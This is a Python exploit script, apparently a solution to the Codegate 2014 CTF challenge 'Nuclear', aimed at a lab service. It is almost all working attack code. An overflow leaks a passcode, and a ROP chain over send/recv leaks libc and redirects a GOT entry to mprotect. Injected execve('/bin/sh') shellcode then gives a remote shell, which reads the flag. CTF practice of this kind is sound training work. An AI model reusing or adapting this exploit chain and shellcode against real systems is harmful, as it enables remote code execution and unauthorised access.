# Codegate 2014 Junior Pwnable
# Nuclear
from err0rless import connst, dump
from struct import pack, unpack

s, t = connst("192.168.95.150", 1129)

# http://shell-storm.org/shellcode/files/shellcode-881.php
# delete `dec %eax`, dup(2) -> dup(4)
sc = ("\x6A\x04\x5B\x6A\x29\x58\xCD\x80\x89\xC6"
	  "\x31\xC9\x56\x5B\x6A\x3F\x58\xCD\x80\x41\x80"
	  "\xF9\x03\x75\xF5\x6A\x0B\x58\x99\x52\x31\xF6"
	  "\x56\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E"
	  "\x89\xE3\x31\xC9\xCD\x80")

def leakPasscode():
	print t.read_until("> ")
	s.send("target\n")
	print s.recv(1024)

	s.send("0.1/0.1\n")
	print t.read_until("> ")
	
	s.send("A" * 0x200 + "\n")
	passcode = s.recv(1024)[0x220-2:-2]

	return passcode

def pMain():
	passcode = leakPasscode()

	print t.read_until("> ")
	s.send("launch\n")

	print t.read_until("nuclear : ")
	s.send(passcode + "\n")

	print t.read_until("100")

	p  = "A" * 0x210
	p += pack("I", 0x08048900) # send.plt
	p += pack("I", 0x0804917C)
	p += pack("I", 0x04)
	p += pack("I", 0x0804B05C)
	p += pack("I", 0x04)
	p += pack("I", 0x00)
	# leak libc

	p += pack("I", 0x080488E0) # recv.plt
	p += pack("I", 0x0804917C)
	p += pack("I", 0x04)
	p += pack("I", 0x0804B07C)
	p += pack("I", 0x04)
	p += pack("I", 0x00000000)

	p += pack("I", 0x080488E0) # recv.plt
	p += pack("I", 0x0804917C)
	p += pack("I", 0x04)
	p += pack("I", 0x0804B088)
	p += pack("I", len(sc))
	p += pack("I", 0x00)

	p += pack("I", 0x08048900) # recv.plt
	p += pack("I", 0x0804B088)
	p += pack("I", 0x0804B000)
	p += pack("I", 0x1000)
	p += pack("I", 0x07)

	s.send(p + "\n")
	mprotect = unpack("I", s.recv(4))[0] - 0xE3CF0

	s.send(pack("I", mprotect))
	s.send(sc)

	s.send("cat key\n")
	print s.recv(1024)

if __name__ == "__main__":
	pMain()